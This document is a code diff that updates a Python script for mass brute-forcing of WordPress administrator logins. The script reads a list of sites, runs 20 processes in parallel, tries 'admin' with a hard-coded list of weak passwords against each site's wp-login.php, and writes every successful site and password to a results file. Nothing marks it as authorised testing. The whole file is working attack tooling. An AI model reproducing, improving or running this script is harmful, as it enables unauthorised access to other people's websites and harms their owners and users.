@@ -1,52 +1,66 @@
-import requests,time
-from colorama import Fore, init
+import requests
 from multiprocessing import Pool
-init(autoreset=True)
+import logging
 
+# Konfigurasi logging
+logging.basicConfig(filename='script.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s: %(message)s')
 
-def login(site):
-        try:
-                datane = {'log':'admin',
-                'pwd':'admin',
-                'wp-submit':'Log+In',
-                'redirect_to':site+'/wp-admin',
-                'testcookie':'1'}
-                response = requests.post(site + "/wp-login.php", data=datane,headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'},timeout=10)              
-                result = response.status_code
-                if result == 302:
-                        with open("result.txt", "a") as result_file:
-                                result_file.write(site+'/wp-login.php'+'|'+'admin'+'|'+'admin'+'\n')
-                        print(Fore.GREEN+"{} [admin:pass]".format(site))
-                else:
-                        print(Fore.RED+"{} [Failed]".format(site))
-        except:
-                pass
+def login(site, session, password):
+    try:
+        url = f'{site}/wp-login.php'
+        headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded',
+            'cookie': 'wordpress_test_cookie=WP%20Cookie%20check',
+            'origin': site,
+            'referer': f'{url}?redirect_to={site}/wp-admin/&reauth=1',
+            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/120.0.0.0',
+            'Connection': 'keep-alive'
+        }
+        data = {
+            'log': 'admin',
+            'pwd': password,
+            'wp-submit': 'Log+In',
+            'redirect_to': f'{site}/wp-admin/',
+            'testcookie': '1'
+        }
 
-def check(site):
-        try:
-                response = requests.get(site + "/wp-admin/install.php",headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'},timeout=10)                
-                result = response.content.split('<h1>')[1].split('</h1>')[0]
-                if result == "Already Installed":
-                        print(Fore.YELLOW+ "{} [Wordpress]".format(site))
-                        login(site)
-                else:
-                        print(Fore.RED+"{} [Another Cms]".format(site))
-        except:
-                pass
+        response = session.post(url, headers=headers, data=data, allow_redirects=False)
+
+        if response.status_code in [301, 302, 303]:
+            with open("result.txt", "a") as result_file:
+                result_file.write(f'{site}/wp-login.php|admin|{password}\n')
+            print(f"\033[32m{site} [admin:{password}]\033[0m")
+            return True
+        else:
+            print(f"\033[31m{site} [Failed]\033[0m")
+    except Exception as e:
+        logging.error(f"Exception in login function for {site}: {e}")
+        return False
 
 def process_site(site):
-    site = site.strip()
-    print("Processing site:", site)
-    if not site.startswith(('http://', 'https://')):
-        site = 'http://' + site
-    check(site)
-
+    with requests.Session() as session:
+        for password in ['admin', 'pass', 'admin@123', 'admin@admin123', 'admin@pass#123', 'admin@pass@123']:
+            if login(site.strip(), session, password):
+                return True
+        return False
 
 if __name__ == '__main__':
-        file = input("File : ")
-        with open(file, "r") as file_content:
-                sites = file_content.readlines()
-        pool = Pool(processes=20)
-        pool.map(process_site, sites)
-        pool.close()
-        pool.join()
+    success_count = 0
+    failed_count = 0
+
+    file = input("File: ")
+
+    with open(file, "r") as file_content:
+        sites = file_content.readlines()
+
+    pool = Pool(processes=20)
+    results = pool.map(process_site, sites)
+    pool.close()
+    pool.join()
+
+    success_count = sum(results)
+    failed_count = len(results) - success_count
+
+    print(f"\nTotal Success: {success_count}")
+    print(f"Total Failed: {failed_count}")
